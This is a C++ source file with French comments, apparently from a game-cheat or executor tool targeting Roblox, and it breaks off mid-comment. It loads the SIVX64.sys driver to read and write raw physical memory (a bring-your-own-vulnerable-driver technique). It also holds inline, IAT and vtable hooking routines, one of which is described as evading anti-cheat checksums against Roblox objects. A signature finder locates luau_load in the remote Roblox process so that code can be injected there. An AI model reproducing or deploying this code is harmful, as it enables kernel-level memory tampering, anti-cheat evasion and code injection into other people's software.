bool FindSivSysPath(std::wstring& out) {
    const wchar_t* candidates[] = {
        L"C:\\Windows\\System32\\drivers\\SIVX64.sys",
        L"C:\\Windows\\Temp\\SIVX64.sys",
        L"C:\\Users\\ASUS\\AppData\\Local\\Temp\\opencode\\SIVX64.sys",
        L"C:\\Windows\\System32\\SIVX64.sys",
    };
    for (auto* p : candidates)
        if (GetFileAttributesW(p) != INVALID_FILE_ATTRIBUTES) { out = p; return true; }
    WIN32_FIND_DATAW fd{};
    HANDLE hf = FindFirstFileW(L"C:\\Windows\\Temp\\SIVX64*", &fd);
    if (hf != INVALID_HANDLE_VALUE) {
        std::wstring p = std::wstring(L"C:\\Windows\\Temp\\") + fd.cFileName;
        FindClose(hf);
        out = p;
        return true;
    }
    return false;
}

// Charge SIVX64.sys comme service kernel puis le demarre.
bool LoadSivDriver(const std::wstring& sysPath) {
    SC_HANDLE sc = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
    if (!sc) { std::cerr << "[siv] OpenSCManager : " << GetLastError() << '\n'; return false; }
    SC_HANDLE svc = CreateServiceW(sc, kSivSvcName, kSivSvcName,
                                   SERVICE_START | DELETE | SERVICE_STOP,
                                   SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
                                   SERVICE_ERROR_NORMAL, sysPath.c_str(), nullptr,
                                   nullptr, nullptr, nullptr, nullptr);
    if (!svc) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_EXISTS) {
            std::cerr << "[siv] CreateService : " << err << '\n';
            CloseServiceHandle(sc);
            return false;
        }
        svc = OpenServiceW(sc, kSivSvcName, SERVICE_START | DELETE | SERVICE_STOP);
    }
    if (!svc) { std::cerr << "[siv] OpenService : " << GetLastError() << '\n'; CloseServiceHandle(sc); return false; }
    if (!StartServiceW(svc, 0, nullptr)) {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            std::cerr << "[siv] StartService : " << err << '\n';
            DeleteService(svc);
            CloseServiceHandle(svc); CloseServiceHandle(sc);
            return false;
        }
    }
    std::cout << "[siv] driver demarre.\n";
    CloseServiceHandle(svc);
    CloseServiceHandle(sc);
    return true;
}

// Arrete puis supprime le service SIVX64.
bool RemoveSivDriver() {
    SC_HANDLE sc = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CONNECT);
    if (!sc) { std::cerr << "[siv] OpenSCManager : " << GetLastError() << '\n'; return false; }
    SC_HANDLE svc = OpenServiceW(sc, kSivSvcName, SERVICE_STOP | DELETE);
    if (!svc) {
        DWORD err = GetLastError();
        CloseServiceHandle(sc);
        if (err == ERROR_SERVICE_DOES_NOT_EXIST) { std::cout << "[siv] service inexistant.\n"; return true; }
        std::cerr << "[siv] OpenService : " << err << '\n';
        return false;
    }
    SERVICE_STATUS ss{};
    ControlService(svc, SERVICE_CONTROL_STOP, &ss);
    Sleep(500);
    DeleteService(svc);
    CloseServiceHandle(svc);
    CloseServiceHandle(sc);
    std::cout << "[siv] service supprime (image residente en memoire jusqu'au reboot).\n";
    return true;
}

// Ouvre \\.\SIVDRIVER. Retourne INVALID_HANDLE_VALUE en cas de refus.
HANDLE OpenSivDevice() {
    HANDLE h = CreateFileW(kSivDevice, GENERIC_READ | GENERIC_WRITE, 0, nullptr,
                           OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (h == INVALID_HANDLE_VALUE) {
        std::wstring ws(kSivDevice);
        std::string ns(ws.begin(), ws.end());
        std::cerr << "[siv] CreateFile(" << ns << ") : " << GetLastError()
                  << " (" << std::system_category().message(GetLastError()) << ")\n";
    }
    return h;
}

// Lecture memoire physique via cmd 0x10. len doit etre dans [4, 0x40000].
bool SivReadPhys(HANDLE dev, uint64_t physAddr, void* out, uint32_t len) {
    if (len < 4 || len > 0x40000) return false;
    SivIoHeader hdr{};
    hdr.phys = physAddr;
    hdr.size = len;
    hdr.flags = 0;
    hdr.pad = 0;
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(dev, kSivCmdRead, &hdr, sizeof(hdr),
                              out, len, &ret, nullptr);
    return ok && ret == len;
}

// Ecriture memoire physique via cmd 0x14 (flags=0x0). Payload = octets a ecrire.
bool SivWritePhys(HANDLE dev, uint64_t physAddr, const void* data, uint32_t len) {
    if (!data || !len) return false;
    std::vector<uint8_t> input(sizeof(SivIoHeader) + len);
    SivIoHeader* hdr = reinterpret_cast<SivIoHeader*>(input.data());
    hdr->phys = physAddr;
    hdr->size = len;
    hdr->flags = 0;   // mode ecriture
    hdr->pad = 0;
    std::memcpy(input.data() + sizeof(SivIoHeader), data, len);
    DWORD ret = 0;
    BOOL ok = DeviceIoControl(dev, kSivCmdWrite, input.data(), (DWORD)input.size(),
                              nullptr, 0, &ret, nullptr);
    return ok != FALSE;
}

// Garantit que le driver SIV est charge (verifie, sinon charge le .sys).
bool EnsureSivLoaded(const std::wstring& explicitPath = std::wstring()) {
    if (SivDriverPresent()) { std::cout << "[siv] driver deja charge.\n"; return true; }
    std::wstring p = explicitPath;
    if (p.empty() && !FindSivSysPath(p)) {
        std::cerr << "[siv] SIVX64.sys introuvable. Installe-le ou specifie le chemin via --siv-load.\n";
        return false;
    }
    if (!p.empty() && GetFileAttributesW(p.c_str()) == INVALID_FILE_ATTRIBUTES) {
        std::string narrow(p.begin(), p.end());
        std::cerr << "[siv] fichier introuvable : " << narrow << '\n';
        return false;
    }
    return LoadSivDriver(p);
}

// --siv-load [chemin SIVX64.sys] : charge le driver SIV.
int RunSivLoad(const std::vector<const char*>& positional) {
    if (!IsProcessElevated()) { std::cerr << "[siv] Elevation UAC requise (relance depuis un terminal admin).\n"; return 1; }
    if (!EnablePrivilegesSiv()) return 1;
    std::wstring explicitPath;
    if (!positional.empty()) {
        const char* a = positional[0];
        int n = MultiByteToWideChar(CP_UTF8, 0, a, -1, nullptr, 0);
        if (n > 0) {
            explicitPath.resize(n - 1);
            MultiByteToWideChar(CP_UTF8, 0, a, -1, &explicitPath[0], n);
        }
    }
    return EnsureSivLoaded(explicitPath) ? 0 : 1;
}

// --byovd-siv : demo de la primitive R/W physique (lecture de controle + ecriture a tester).
int RunByovdSivDemo(const std::vector<const char*>& positional) {
    if (!IsProcessElevated()) { std::cerr << "[siv] Elevation UAC requise (relance depuis un terminal admin).\n"; return 1; }
    std::cout << "=== BYOVD-SIV (SIVX64.sys) — primitive R/W memoire physique ===\n\n";
    if (!EnablePrivilegesSiv()) return 1;

    std::wstring explicitPath;
    for (const char* a : positional) {
        std::string_view s(a);
        if (s.size() > 2 && s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) break;  // adresse hex, pas un chemin
        if (GetFileAttributesA(a) != INVALID_FILE_ATTRIBUTES) {
            int n = MultiByteToWideChar(CP_UTF8, 0, a, -1, nullptr, 0);
            if (n > 0) {
                explicitPath.resize(n - 1);
                MultiByteToWideChar(CP_UTF8, 0, a, -1, &explicitPath[0], n);
            }
            break;
        }
    }

    if (!EnsureSivLoaded(explicitPath)) return 2;
    HANDLE dev = OpenSivDevice();
    if (dev == INVALID_HANDLE_VALUE) return 1;

    // Lecture de controle : 256 octets a phys 0x100000 (memes parametres que
    // slytool valide, qui y voyait "RCRD" = descripteurs memoire noyau).
    uint8_t buf[256]{};
    if (SivReadPhys(dev, 0x100000, buf, sizeof(buf))) {
        std::cout << "[siv] lecture OK phys=0x100000 : " << sizeof(buf) << " octets\n[hex] ";
        std::ios old(nullptr);
        old.copyfmt(std::cout);
        for (int i = 0; i < 16; ++i)
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)buf[i] << ' ';
        std::cout << std::dec << "...\n";
        std::cout.copyfmt(old);
        std::cout << "[siv] primitive READ validee.\n";
    } else {
        std::cerr << "[siv] lecture phys=0x100000 echouee : " << GetLastError() << '\n';
    }
    CloseHandle(dev);
    return 0;
}

// --siv-read <physAddrHex> <len> : lecture memoire physique brute.
int RunSivRead(const std::vector<const char*>& positional) {
    if (positional.size() < 2) { std::cerr << "Usage : aob.exe --siv-read <physAddrHex> <len>\n"; return 1; }
    if (!IsProcessElevated()) { std::cerr << "[siv] Elevation UAC requise (relance depuis un terminal admin).\n"; return 1; }
    uint64_t addr = std::strtoull(positional[0], nullptr, 16);
    uint32_t len = (uint32_t)std::strtoul(positional[1], nullptr, 0);
    if (!EnablePrivilegesSiv()) return 1;

    std::wstring none;
    if (!EnsureSivLoaded(none)) return 2;
    HANDLE dev = OpenSivDevice();
    if (dev == INVALID_HANDLE_VALUE) return 1;

    std::vector<uint8_t> buf(len);
    if (SivReadPhys(dev, addr, buf.data(), len)) {
        for (uint32_t i = 0; i < len; ++i) {
            if (i && (i % 16) == 0) std::cout << '\n';
            std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)buf[i] << ' ';
        }
        std::cout << std::dec << '\n';
    } else {
        std::cerr << "[siv] lecture phys=0x" << std::hex << addr << std::dec
                  << " echouee : " << GetLastError() << '\n';
    }
    CloseHandle(dev);
    return 0;
}

// --siv-write <physAddrHex> <hexBytes> : ecriture memoire physique.
int RunSivWrite(const std::vector<const char*>& positional) {
    if (positional.size() < 2) { std::cerr << "Usage : aob.exe --siv-write <physAddrHex> <hexBytes>\n"; return 1; }
    uint64_t addr = std::strtoull(positional[0], nullptr, 16);
    std::vector<uint8_t> data;
    {
        std::string_view hexs(positional[1]);
        for (size_t i = 0; i < hexs.size(); ++i) {
            while (i < hexs.size() && (hexs[i] == ' ' || hexs[i] == ',')) ++i;
            if (i + 1 >= hexs.size()) break;
            auto xd = [](char c) -> int {
                if (c >= '0' && c <= '9') return c - '0';
                if (c >= 'a' && c <= 'f') return c - 'a' + 10;
                if (c >= 'A' && c <= 'F') return c - 'A' + 10;
                return -1;
            };
            int h = xd(hexs[i]), l = xd(hexs[i + 1]);
            if (h < 0 || l < 0) continue;
            data.push_back((uint8_t)((h << 4) | l));
            ++i;
        }
    }
    if (data.empty() || data.size() > 0x40000) { std::cerr << "[siv] octets hexa invalides/trop longs.\n"; return 1; }
    if (!IsProcessElevated()) { std::cerr << "[siv] Elevation UAC requise (relance depuis un terminal admin).\n"; return 1; }
    if (!EnablePrivilegesSiv()) return 1;

    std::wstring none;
    if (!EnsureSivLoaded(none)) return 2;
    HANDLE dev = OpenSivDevice();
    if (dev == INVALID_HANDLE_VALUE) return 1;

    if (SivWritePhys(dev, addr, data.data(), (uint32_t)data.size()))
        std::cout << "[siv] ecriture OK : " << data.size() << " octets a phys=0x"
                  << std::hex << addr << std::dec << '\n';
    else
        std::cerr << "[siv] ecriture phys=0x" << std::hex << addr << std::dec
                  << " echouee : " << GetLastError() << '\n';
    CloseHandle(dev);
    return 0;
}
#endif // _WIN32

int RunLocalDemo() {
    // Bloc mémoire simulé (ex : section de code).
    const uint8_t memory[] = {
        0x90, 0x90, 0xCC,
        0x48, 0x89, 0x5C, 0x24, 0x08, 0x50,   // <- match à l'offset 3
        0x48, 0x89, 0x5C, 0x24, 0x10, 0x51,   // presque (dernier octet différent)
        0x48, 0x89, 0x5C, 0x24, 0x20, 0x50,   // <- match à l'offset 15
        0xC3,
    };

    auto pattern = ParsePattern("48 89 5C 24 ?? 50");
    if (!pattern) {
        std::cerr << "Signature invalide\n";
        return 1;
    }

    if (auto off = FindPattern(memory, sizeof(memory), *pattern))
        std::cout << "Premier match a l'offset " << *off << '\n';
    else
        std::cout << "Aucun match\n";

    auto all = FindAllPatterns(memory, sizeof(memory), *pattern);
    std::cout << all.size() << " occurrence(s) :";
    for (size_t o : all) std::cout << ' ' << o;
    std::cout << '\n';

#ifdef _WIN32
    uintptr_t base = reinterpret_cast<uintptr_t>(memory);
    if (auto addr = FindPatternInProcess(base, base + sizeof(memory), *pattern))
        std::cout << "Adresse process : 0x" << std::hex << *addr
                  << " (offset " << std::dec << (*addr - base) << ")\n";
#endif
    return 0;
}

#ifdef _WIN32
// ---------------------------------------------------------------------------
// Démo hook inline : scan -> alloc stub -> hook -> unhook, EN LOCAL (même
// process) pour être vérifiable sans cible. Le MÊME InstallInlineHook marche
// cross-process en passant le HANDLE de la cible au lieu de GetCurrentProcess().
// Attendu : Target() 21 -> 42 (hooké) -> 21 (déhooké).
// ---------------------------------------------------------------------------
using TargetFn = int (*)();

int RunHookDemo() {
    HANDLE self = GetCurrentProcess();

    // Fonction cible fabriquée à la main : déterministe, prologue connu, renvoie 21.
    static const uint8_t kTarget[] = {
        0x48, 0x83, 0xEC, 0x28,             // sub  rsp, 28h
        0xB8, 0x07, 0x00, 0x00, 0x00,       // mov  eax, 7
        0x83, 0xC0, 0x07,                   // add  eax, 7
        0x83, 0xC0, 0x07,                   // add  eax, 7      -> eax = 21
        0x48, 0x83, 0xC4, 0x28,             // add  rsp, 28h
        0xC3,                               // ret
    };
    // Détour : appelle l'original (via la trampoline) puis double son retour.
    static const uint8_t kDetour[] = {
        0x48, 0x83, 0xEC, 0x28,             // sub  rsp, 28h
        0xFF, 0x15, 0x02, 0x00, 0x00, 0x00, // call qword ptr [rip+2] -> [placeholder]
        0xEB, 0x08,                         // jmp  +8 (saute le placeholder)
        0, 0, 0, 0, 0, 0, 0, 0,             // <-- PLACEHOLDER trampoline (offset 12)
        0x48, 0x83, 0xC4, 0x28,             // add  rsp, 28h
        0x01, 0xC0,                         // add  eax, eax
        0xC3,                               // ret
    };
    const size_t kDetourTrampOff = 12;

    LPVOID targetMem = AllocateAndWriteStub(self, kTarget, sizeof(kTarget));
    if (!targetMem) return 1;
    auto Target = reinterpret_cast<TargetFn>(targetMem);
    std::cout << "Target() avant hook   : " << Target() << '\n';

    // 1) SCAN : localiser le prologue via l'AoB scanner.
    auto pat = ParsePattern("48 83 EC 28");   // sub rsp, 28h
    auto off = FindPattern(reinterpret_cast<uint8_t*>(targetMem), sizeof(kTarget), *pat);
    if (!off) { std::cerr << "Signature introuvable\n"; return 1; }
    uintptr_t target = reinterpret_cast<uintptr_t>(targetMem) + *off;
    std::cout << "Prologue trouve a 0x" << std::hex << target << std::dec
              << " (offset " << *off << ")\n";

    // 2) ALLOC STUB : écrire le détour.
    LPVOID detourMem = AllocateAndWriteStub(self, kDetour, sizeof(kDetour));
    if (!detourMem) return 1;

    // 3) HOOK.
    auto hook = InstallInlineHook(self, target, reinterpret_cast<uintptr_t>(detourMem));
    if (!hook) return 1;

    // 4) Câbler le placeholder du détour sur la trampoline.
    uintptr_t tramp = hook->trampoline;
    SIZE_T w = 0;
    WriteProcessMemory(self, reinterpret_cast<uint8_t*>(detourMem) + kDetourTrampOff,
                       &tramp, sizeof(tramp), &w);
    FlushInstructionCache(self, detourMem, sizeof(kDetour));
    std::cout << "Target() apres hook   : " << Target() << "   (attendu 42)\n";

    // 5) UNHOOK.
    if (!RemoveInlineHook(self, *hook)) { std::cerr << "RemoveInlineHook a echoue\n"; return 1; }
    std::cout << "Target() apres unhook : " << Target() << "   (attendu 21)\n";

    VirtualFreeEx(self, detourMem, 0, MEM_RELEASE);
    VirtualFreeEx(self, targetMem, 0, MEM_RELEASE);
    return 0;
}

// ---------------------------------------------------------------------------
// Démo hook IAT : détourne GetTickCount sur soi-même, puis restaure.
// ---------------------------------------------------------------------------
using GetTickFn = DWORD (WINAPI*)();
static GetTickFn oGetTick = nullptr;
static DWORD WINAPI hkGetTick() { return 123456; }

int RunIatDemo() {
    std::cout << "GetTickCount avant hook  : " << GetTickCount() << '\n';
    if (!HookIAT(nullptr, nullptr, "GetTickCount", (void*)&hkGetTick, (void**)&oGetTick)) {
        std::cerr << "HookIAT a echoue (fonction pas dans l'IAT ?)\n";
        return 1;
    }
    std::cout << "GetTickCount apres hook  : " << GetTickCount() << "   (attendu 123456)\n";
    std::cout << "original via pointeur    : " << oGetTick() << "   (vraie valeur)\n";
    HookIAT(nullptr, nullptr, "GetTickCount", (void*)oGetTick, nullptr);  // déhook
    std::cout << "GetTickCount apres unhook: " << GetTickCount() << "   (vraie valeur)\n";
    return 0;
}

// ---------------------------------------------------------------------------
// Démo hook VMT (feature 4) : redirection d'une entrée de vtable, EN LOCAL.
// Une vtable est un tableau de pointeurs stocké en .rdata (image du process) ;
// rediriger UNE entrée suffit pour détourner un appel virtuel SANS toucher au
// code de la fonction (aucun patch .text, checksums AC non déclenchés).
// Le MÊME InstallPtrRedirect s'utilise cross-process contre un objet Roblox.
// Appels faits via un pointeur de base (non devirtualisables) pour forcer le
// dispatch virtuel. Détection du slot de Compute() par brute-force.
// ---------------------------------------------------------------------------
struct VmtDemoIface {
    virtual ~VmtDemoIface() {}
    virtual int Compute() const { return 21; }
};
struct VmtDemoObj : VmtDemoIface {};

static int VmtCallCompute(VmtDemoIface* o) { return o->Compute(); }
static int VmtCallTwice(VmtDemoIface* o)   { return o->Compute() * 2; }
static int __fastcall hkVmtCompute(VmtDemoIface*) { return 100; }

int RunVmtDemo() {
    VmtDemoObj obj;
    VmtDemoIface* base = &obj;
    uintptr_t vtable = *reinterpret_cast<uintptr_t*>(base);   // 1er champ = vfptr
    std::cout << "[vmt] vtable         : 0x" << std::hex << vtable << std::dec << "\n";
    std::cout << "[vmt] Compute avant  : " << VmtCallCompute(base) << "   (attendu 21)\n";

    // Brute-force : quel slot de la vtable est invoqué par Compute() ?
    uintptr_t computeSlot = 0;
    for (int i = 0; i < 8; ++i) {
        uintptr_t slot = vtable + static_cast<uintptr_t>(i) * 8;
        PtrRedirect r;
        if (!InstallPtrRedirect(GetCurrentProcess(), slot,
                                reinterpret_cast<uintptr_t>(&hkVmtCompute), r, false))
            break;
        const bool hit = VmtCallCompute(base) == 100;
        RestorePtrRedirect(GetCurrentProcess(), r);
        if (hit) { computeSlot = slot; break; }
    }
    if (!computeSlot) { std::cerr << "[vmt] slot de Compute() introuvable.\n"; return 1; }

    std::cout << "[vmt] slot compute   : 0x" << std::hex << computeSlot << std::dec
              << "  (entree vtable redirigee)\n";

    PtrRedirect hook;
    if (!InstallPtrRedirect(GetCurrentProcess(), computeSlot,
                            reinterpret_cast<uintptr_t>(&hkVmtCompute), hook)) return 1;
    std::cout << "[vmt] Compute apres  : " << VmtCallCompute(base) << "   (attendu 100)\n";
    std::cout << "[vmt] Twice apres    : " << VmtCallTwice(base) << "   (attendu 200)\n";

    if (!RestorePtrRedirect(GetCurrentProcess(), hook)) { std::cerr << "[vmt] restauration KO\n"; return 1; }
    std::cout << "[vmt] Compute restore: " << VmtCallCompute(base) << "   (attendu 21)\n";
    return 0;
}

// ---------------------------------------------------------------------------
// Mode --sig-update : MISE A JOUR AUTOMATIQUE de la signature luau_load quand
// toutes les signatures intégrées sont périmées. Principe (comme CE) :
//   1) collecte des candidats de la famille de prologue sur le module Roblox
//   2) discrimination par nombre d'appels directs (`call rel32`) qui les visent
//      -> luau_load a des DIZAINES de callers (loadstring, wrappers, scripts)
//   3) le meilleur candidat est étendu octet par octet jusqu'à l'UNICITÉ dans
//      le module (la signature persistée ne doit jamais matcher 2 fonctions)
//   4) écriture dans luau_sigs.txt (rechargé automatiquement au prochain run)
// ---------------------------------------------------------------------------

// Toutes les occurrences d'un pattern dans une plage distante [start,end),
// morceau par morceau avec chevauchement (base : FindPatternInRemoteRange).
std::vector<uintptr_t> FindAllPatternsInRemoteRange(HANDLE proc, uintptr_t start, uintptr_t end,
                                                    const Pattern& pattern) {
    std::vector<uintptr_t> results;
    if (!proc || pattern.empty() || start >= end) return results;
    const size_t n = pattern.size();
    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;

    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = start;
    while (addr < end &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t rb = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t re = rb + mbi.RegionSize;
        if (re <= addr) break;
        if (IsReadableRegion(mbi)) {
            uintptr_t from = (std::max)(addr, rb);
            uintptr_t to   = (std::min)(end, re);
            for (uintptr_t chunk = from; chunk < to; chunk += kChunk) {
                size_t want = (std::min)(uintptr_t(kChunk + n - 1), to - chunk);
                buffer.resize(want);
                SIZE_T got = 0;
                if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got))
                    continue;
                for (size_t off : FindAllPatterns(buffer.data(), got, pattern))
                    results.push_back(chunk + off);
            }
        }
        addr = re;
    }
    std::sort(results.begin(), results.end());
    results.erase(std::unique(results.begin(), results.end()), results.end());
    return results;
}

// Compte, pour chaque adresse candidate, les appels directs `call rel32`
// (E8) présents dans la plage [start,end) qui la visent.
std::unordered_map<uintptr_t, int> CountProgramCallers(
    HANDLE proc, uintptr_t start, uintptr_t end,
    const std::unordered_set<uintptr_t>& candidates) {
    std::unordered_map<uintptr_t, int> count;
    if (candidates.empty()) return count;

    const size_t kChunk = size_t{1} << 20;
    std::vector<uint8_t> buffer;
    MEMORY_BASIC_INFORMATION mbi{};
    uintptr_t addr = start;
    while (addr < end &&
           VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) == sizeof(mbi)) {
        uintptr_t rb = reinterpret_cast<uintptr_t>(mbi.BaseAddress);
        uintptr_t re = rb + mbi.RegionSize;
        if (re <= addr) break;
        if (IsReadableRegion(mbi)) {
            uintptr_t from = (std::max)(addr, rb);
            uintptr_t to   = (std::min)(end, re);
            for (uintptr_t chunk = from; chunk < to; chunk += kChunk) {
                size_t want = (std::min)(uintptr_t(kChunk + 4), to - chunk);
                buffer.resize(want);
                SIZE_T got = 0;
                if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(chunk), buffer.data(), want, &got))
                    continue;
                for (size_t i = 0; i + 5 <= got; ++i) {
                    if (buffer[i] != 0xE8) continue;
                    int32_t rel = 0;
                    std::memcpy(&rel, buffer.data() + i + 1, 4);
                    const uintptr_t tgt =
                        chunk + i + 5 + static_cast<uintptr_t>(static_cast<intptr_t>(rel));
                    if (candidates.count(tgt)) ++count[tgt];
                }
            }
        }
        addr = re;
    }
    return count;
}

// Dump d'octets en hexa "AA BB CC ..." (pour signature).
std::string SigFromBytes(const uint8_t* bytes, size_t len) {
    std::string out;
    for (size_t i = 0; i < len; ++i) {
        char tmp[4];
        std::snprintf(tmp, sizeof(tmp), "%02X", bytes[i]);
        if (!out.empty()) out += ' ';
        out += tmp;
    }
    return out;
}

// ---------------------------------------------------------------------------
// Candidats luau_load = prologues de la famille, classés par score de
// plausibilité : nb de callers directs (E8 rel32) + indices de prologue.
// ---------------------------------------------------------------------------
struct SigCandidate {
    uintptr_t addr;
    int       callers;
    int       score;
};

std::vector<SigCandidate> CollectLuauCandidates(HANDLE proc, const ModuleInfo& mod,
                                                size_t* outScanned = nullptr) {
    // Prologues de la famille luau_load (mêmes formes que kLuauLoad, sans la
    // partie qui varie d'une build à l'autre).
    const char* kFamilies[] = {
        "40 53 48 83 EC 30 48 8B D9",                 // push rbx; sub rsp,30; mov rbx,rcx
        "40 53 48 83 EC 30 48 8B D9 49 8B C8",        // + mov r9,r8 (continue)
        "48 89 5C 24 08 57 48 83 EC 30 48 8B D9",     // save rbx + push rdi
        "40 57 48 83 EC 30 48 8B D9",                 // push rdi + sub rsp
        "48 8B C4 48 89 58 20 57 48 83 EC 30 48 8B D9",  // mov [rsp+20],rbx
    };
    std::vector<uintptr_t> cands;
    for (const char* fam : kFamilies) {
        auto pat = ParsePattern(fam);
        if (!pat) continue;
        for (uintptr_t h : FindAllPatternsInRemoteRange(proc, mod.base, mod.base + mod.size, *pat))
            cands.push_back(h);
    }
    std::sort(cands.begin(), cands.end());
    cands.erase(std::unique(cands.begin(), cands.end()), cands.end());
    if (outScanned) *outScanned = cands.size();
    if (cands.empty()) return {};

    // Comptage des callers directs : le vrai luau_load a beaucoup d'appels.
    std::unordered_set<uintptr_t> candSet(cands.begin(), cands.end());
    std::unordered_map<uintptr_t, int> callers =
        CountProgramCallers(proc, mod.base, mod.base + mod.size, candSet);

    std::vector<SigCandidate> scored;
    for (uintptr_t c : cands) {
        SigCandidate sc{};
        sc.addr = c;
        sc.callers = callers[c];
        sc.score = (std::min)(sc.callers, 300);   // signal dominant : nb de calls
        if (sc.callers > 0) sc.score += 10;       // au moins un appel prouve du code
        uint8_t b[2] = { 0, 0 };
        SIZE_T got = 0;
        // continue du prologue : mov r9,r8 (49 8B C8) = forme ancienne classique
        if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(c + 9), b, 2, &got) &&
            got == 2 && b[0] == 0x49 && b[1] == 0x8B)
            sc.score += 30;
        // octet précédent : padding 0xCC (début de fonction) ou fin (C3/E9/90)
        uint8_t prev = 0;
        if (ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(c - 1), &prev, 1, &got) && got == 1) {
            if (prev == 0xCC)      sc.score += 10;
            else if (prev == 0xC3 || prev == 0xE9 || prev == 0x90) sc.score += 4;
        }
        scored.push_back(sc);
    }
    std::sort(scored.begin(), scored.end(), [](const SigCandidate& a, const SigCandidate& b) {
        if (a.score != b.score) return a.score > b.score;
        return a.callers > b.callers;
    });
    return scored;
}

int RunSigUpdateDemo(const std::vector<const char*>& positional) {
    std::cout << "=== Mise a jour automatique des signatures luau_load ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    if (!EnableDebugPrivilege())
        std::cerr << "Avertissement : SeDebugPrivilege indisponible.\n";

    DWORD pid = 0;
    for (size_t i = 0; i < positional.size(); ++i) {
        if (i == 0) {
            if (auto p = ResolveTargetPid(positional[i])) pid = *p;
            else { std::cerr << "Cible invalide : " << positional[i] << '\n'; return 1; }
        }
    }
    if (!pid) { std::cerr << "Aucune cible. Usage : aob.exe --sig-update <pid|exe>\n"; return 1; }

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    auto mods = EnumModules(pid);
    const ModuleInfo* mod = ChooseRobloxModule(mods);
    if (!mod) { std::cerr << "Module Roblox introuvable.\n"; return 1; }
    std::cout << "Module : 0x" << std::hex << mod->base << std::dec << "  (" << mod->size
              << " octets)\n";

    // 1) Collecte + classement des candidats (prologues famille + callers).
    size_t nScanned = 0;
    std::vector<SigCandidate> scored = CollectLuauCandidates(proc.get(), *mod, &nScanned);
    std::cout << "[scan] " << nScanned << " candidat(s) de la famille luau_load.\n";
    if (scored.empty()) {
        std::cerr << "  Aucun prologue connu ne matche : la build a trop change\n"
                  << "  (push/sub rsp/mov rbx,rcx). Passe les adresses en hexa manuellement.\n";
        return 2;
    }

    const int kShow = (std::min)(size_t{8}, scored.size());
    std::cout << "\nClassement des candidats (score / callers / adresse) :\n";
    for (size_t i = 0; i < scored.size() && i < 8; ++i) {
        std::cout << "  [" << (i + 1) << "] score " << scored[i].score
                  << "  callers " << scored[i].callers << "  0x"
                  << std::hex << scored[i].addr << std::dec << '\n';
    }
    if (kShow < (int)scored.size())
        std::cout << "  ... +" << (scored.size() - kShow) << " candidat(s).\n";

    const SigCandidate& best = scored.front();
    if (best.score < 20) {   // seuil : aucun candidat ne ressemble assez à une cible réelle
        std::cerr << "\nAucun candidat fiable (score max " << best.score
                  << " < 20). Passes l'adresse luau_load en hexa manuellement.\n";
        return 2;
    }

    // 3) Étend la signature du meilleur candidat jusqu'à l'unicité dans le module.
    std::vector<uint8_t> mem(0x40, 0);
    SIZE_T got = 0;
    size_t have = 0;
    if (!ReadProcessMemory(proc.get(), reinterpret_cast<LPCVOID>(best.addr), mem.data(),
                           mem.size(), &got))
        have = 0;
    else
        have = got;

    std::string newSig;
    size_t len = 9;   // prologue complet (mov rbx,rcx compris)
    bool unique = false;
    while (len <= have && len <= mem.size()) {
        newSig = SigFromBytes(mem.data(), len);
        auto pat = ParsePattern(newSig);
        if (pat) {
            // Unicité exigée dans le MODULE ET dans TOUT le processus : une
            // signature qui se résout autre part (build changée, copy-paste)
            // ferait échouer l'exécution en silence (load/pcall = -1).
            auto hitsMod = FindAllPatternsInRemoteRange(proc.get(), mod->base,
                                                        mod->base + mod->size, *pat);
            auto hitsAll = FindAllPatternsInRemoteProcess(proc.get(), *pat, 4);
            if (hitsMod.size() == 1 && hitsMod[0] == best.addr && hitsAll.size() == 1) {
                unique = true;
                break;
            }
        }
        ++len;
    }
    if (!unique) {
        std::cout << "\nSignature du meilleur candidat non unique en 0x" << std::hex
                  << (mem.size() > have ? have : mem.size()) << std::dec
                  << " octets ; premiere legere approximation :\n";
    }
    std::cout << "\nMeilleur candidat  : 0x" << std::hex << best.addr << std::dec
              << "  (callers " << best.callers << ")\n";
    std::cout << "Bytes (@candidat)  : " << newSig << '\n';
    if (!unique) return 2;

    // 4) Persiste.
    if (SigStore::Append(newSig)) {
        std::cout << "\n[OK] luau_sigs.txt mis a jour - signature enregistree :\n"
                  << "     " << newSig << '\n';
    } else {
        std::cerr << "\n[!] Echec de l'ecriture dans luau_sigs.txt\n";
        return 1;
    }

    // 5) Vérification immédiate : recharger le fichier et re-résoudre.
    std::vector<std::string> saved = SigStore::LoadFile();
    std::vector<const char*> merged;
    for (const auto& s : saved) merged.push_back(s.c_str());
    for (const char* s : LuauEscapeSigs::kLuauLoad) merged.push_back(s);
    uintptr_t resolved = 0;
    if (ResolveLuauFunctionAny(proc.get(), *mod, merged, resolved, "luau_load")) {
        std::cout << "  -> luau_load de nouveau resolu a 0x" << std::hex << resolved
                  << std::dec << " (auto au prochain lancement).\n";
        return 0;
    }
    std::cerr << "  -> la signature ecrite ne re-resout pas (etrange) ; a verifier.\n";
    return 1;
}

// ---------------------------------------------------------------------------
// AUTO-FIX : résolution par EXÉCUTION. Au lieu de deviner le bon candidat par
// score, on sonde chaque candidat (classé) avec un snippet minimal : le premier
// qui aboutit à luau_load => 0 / lua_pcall => 0 EST luau_load. Sa signature est
